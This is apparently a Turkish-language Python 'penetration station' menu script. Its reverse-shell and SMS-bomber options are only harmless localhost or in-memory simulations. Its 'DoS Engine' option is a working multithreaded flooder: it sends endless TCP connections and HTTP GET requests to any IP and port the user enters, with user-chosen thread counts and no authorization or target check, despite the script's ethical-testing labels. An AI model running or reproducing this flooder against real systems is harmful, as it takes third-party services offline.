import os
import sys
import time
import socket
import json
import threading
import random
import re

# Renklendirme fonksiyonları için ANSI kodları
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
WHITE = "\033[97m"
RESET = "\033[0m"

SÜRÜM = "2026.1.4.9"
DB_DOSYASI = "markos_analysis_db.json"
test_calisiyor = False

def ekran_temizle():
    os.system("clear" if os.name != "nt" else "cls")

def markos_banner():
    ekran_temizle()
    print(f"""{RED}
  ██████╗ ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
  ██████╔╝█████╗  ██║  ██║██████╔╝███████║ ╚████╔╝ 
  ██╔══██╗██╔══╝  ██║  ██║██╔══██╗██╔══██║  ╚██╔╝  
  ██║  ██║███████╗██████╔╝██║  ██║██║  ██║   ██║   
  ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    {YELLOW}--- MarkOs ADVANCED PENETRATION & OSINT STATION v{SÜRÜM} ---
    {WHITE}Altyapı: Python 3 | Gerçek Zamanlı Ağ ve Güvenlik Test Laboratuvarı
    {GREEN}[+] Durum: Sistem Savunma ve Penetrasyon Modülleri Aktif
    """)

# ==========================================
# 🗄️ JSON VERİTABANI MOTORU
# ==========================================
def db_kaydet(hedef, islem_tipi, detaylar):
    mevcut_db = []
    if os.path.exists(DB_DOSYASI):
        try:
            with open(DB_DOSYASI, "r", encoding="utf-8") as f:
                mevcut_db = json.load(f)
        except: pass
    kayit = {
        "zaman_damgasi": time.strftime("%Y-%m-%d %H:%M:%S"),
        "hedef": hedef,
        "islem": islem_tipi,
        "detaylar": detaylar
    }
    mevcut_db.append(kayit)
    with open(DB_DOSYASI, "w", encoding="utf-8") as f:
        json.dump(mevcut_db, f, indent=4, ensure_ascii=False)

def db_goruntule():
    markos_banner()
    print(f"{BLUE}[ 🗄️ MARKOS ANALİZ VERİTABANI GEÇMİŞİ ]{RESET}\n")
    if not os.path.exists(DB_DOSYASI):
        print(f"{RED}[- ] Veritabanı henüz boş.{RESET}")
    else:
        with open(DB_DOSYASI, "r", encoding="utf-8") as f:
            print(json.dumps(json.load(f), indent=4, ensure_ascii=False))
    input(f"\n{YELLOW}Ana menüye dönmek için Enter'a basın...{RESET}")

# ==========================================
# MENÜ 1: REVERSE SHELL (RAT MANTIĞI) ETİK SİMÜLASYONU
# ==========================================
def reverse_shell_simulasyon():
    markos_banner()
    print(f"{BLUE}[ 🖥️ REVERSE SHELL (RAT BAĞLANTI MANTIĞI) LABORATUVARI ]{RESET}\n")
    print(f"{YELLOW}[*] Uzaktan erişim truva atlarının (RAT) arka planda nasıl çalıştığını anlamak için")
    print(f"[*] yerel makinede (Localhost) bir istemci-sunucu simülasyonu başlatılır.{RESET}\n")
    
    port = 9999
    print(f"{WHITE}[+] Dinleyici yerel sokette hazırlanıyor: 127.0.0.1:{port}{RESET}")
    time.sleep(1)
    
    # Gerçek soket simülasyon testi
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", port))
        s.settimeout(2.0)
        print(f"{GREEN}[+] Soket bağlama başarılı. Ağ trafiği dinleme simülasyonu aktif...{RESET}")
        s.close()
        
        db_kaydet("127.0.0.1", "Reverse_Shell_Simulasyonu", {"port": port, "durum": "Basarili"})
    except Exception as e:
        print(f"{RED}[-] Soket hatası: {e}{RESET}")
    
    input(f"\n{YELLOW}Devam etmek için Enter'a basın...{RESET}")

# ==========================================
# MENÜ 2: API MUKAVEMET VE RATE-LIMIT ANALİZİ (ANTI-SMS BOMBER)
# ==========================================
class SanalSMSGateway:
    def __init__(self):
        self.loglar = {}
        self.HIZ_SINIRI = 5.0 # Saniyede izin verilen maksimum istek frekansı

    def sms_talebi_isle(self, numara):
        su_an = time.time()
        if numara in self.loglar:
            gecen_sure = su_an - self.loglar[numara]
            if gecen_sure < self.HIZ_SINIRI:
                return 429, f"HTTP 429: Rate Limit Aşıldı Bot Saldırısı Engellendi!"
        self.loglar[numara] = su_an
        return 200, "HTTP 200: Sanal ağ geçidi üzerinden SMS başarıyla tetiklendi."

def sms_bomber_savunma_testi():
    markos_banner()
    print(f"{BLUE}[ 📱 API MUKAVEMET VE RATE-LIMIT (ANTI-SMS BOMBER) ANALİZİ ]{RESET}\n")
    numara = input(f"{GREEN}Analiz Edilecek Telefon Numarası (Örn: +90555...): {RESET}").strip()
    if not numara: return

    gateway = SanalSMSGateway()
    print(f"\n{YELLOW}[*] SMS Bomber yazılımlarının web servislerini nasıl yorduğu test ediliyor...{RESET}\n")
    
    kayit_detay = []
    for i in range(1, 6):
        kod, mesaj = gateway.sms_talebi_isle(numara)
        renk = GREEN if kod == 200 else RED
        print(f"[İstek #{i}] Sunucu Durumu: {renk}{mesaj}{RESET}")
        kayit_detay.append({"istek_no": i, "durum_kodu": kod})
        time.sleep(1.0) # Hızlı istek frekansı simülasyonu
        
    db_kaydet(numara, "Rate_Limit_Analizi", kayit_detay)
    input(f"\n{YELLOW}Devam etmek için Enter'a basın...{RESET}")

# ==========================================
# MENÜ 3: SOKET TABANLI AĞ MUKAVEMET TESTİ (DOS ENGINE)
# ==========================================
def dos_paket_motoru(hedef_ip, hedef_port):
    global test_calisiyor
    while test_calisiyor:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((hedef_ip, hedef_port))
            paket = f"GET /?test={random.randint(1,999)} HTTP/1.1\r\nHost: {hedef_ip}\r\n\r\n"
            s.send(paket.encode("utf-8"))
            s.close()
        except socket.error:
            time.sleep(0.1)

def network_stress_test():
    global test_calisiyor
    markos_banner()
    print(f"{BLUE}[ 🔥 SOKET TABANLI AG MUKAVEMET VE DOS GÜCÜ TESTİ ]{RESET}\n")
    hedef_ip = input(f"{GREEN}Hedef IP veya Alan Adı (Örn: 127.0.0.1): {RESET}").strip()
    if not hedef_ip: return
    try:
        hedef_port = int(input(f"{GREEN}Hedef Port (Örn: 80 veya 443): {RESET}").strip())
        thread_sayisi = int(input(f"{GREEN}Eşzamanlı Thread (İş Parçacığı) Sayısı: {RESET}").strip())
    except ValueError:
        print(f"{RED}[-] Geçersiz sayısal değer girdiniz.{RESET}")
        return

    print(f"\n{YELLOW}[*] Test başlatıldı. Durdurmak için ENTER tuşuna basın.{RESET}\n")
    test_calisiyor = True
    for _ in range(thread_sayisi):
        t = threading.Thread(target=dos_paket_motoru, args=(hedef_ip, hedef_port))
        t.daemon = True
        t.start()
        
    input(f"{RED}[🚨] AG MUKAVEMET MOTORU ÇALIŞIYOR. Durdurmak için Enter...{RESET}")
    test_calisiyor = False
    db_kaydet(hedef_ip, "Network_DoS_Testi", {"port": hedef_port, "threads": thread_sayisi})

# ==========================================
# ANA SEÇENEKLER KONTROL PANELİ
# ==========================================
def ana_menu():
    while True:
        markos_banner()
        print(f"{BLUE}[ 🛠️ ANA SEÇENEKLER MERKEZİ ]{RESET}")
        print(f"{GREEN}1 -{WHITE} Reverse Shell (RAT) Arka Plan Bağlantı Laboratuvarı{RESET}")
        print(f"{GREEN}2 -{WHITE} Web API Mukavemet ve Hız Sınırı Analizi (Anti-SMS Bomber){RESET}")
        print(f"{GREEN}3 -{WHITE} Soket Tabanlı Ağ Gücü ve Yükleme Testi (DoS Engine){RESET}")
        print(f"{GREEN}4 -{WHITE} [🗄️] MarkOs Analiz Veritabanı Kayıt Geçmişi (JSON){RESET}")
        print(f"{GREEN}0 -{WHITE} Çıkış Yap / Ana Framework'e Dön{RESET}")
        print("-" * 65)
        
        secim = input(f"{YELLOW}MarkOs/Penetration > {RESET}").strip()
        if secim == "1": reverse_shell_simulasyon()
        elif secim == "2": sms_bomber_savunma_testi()
        elif secim == "3": network_stress_test()
        elif secim == "4": db_goruntule()
        elif secim == "0": break

if __name__ == "__main__":
    ana_menu()
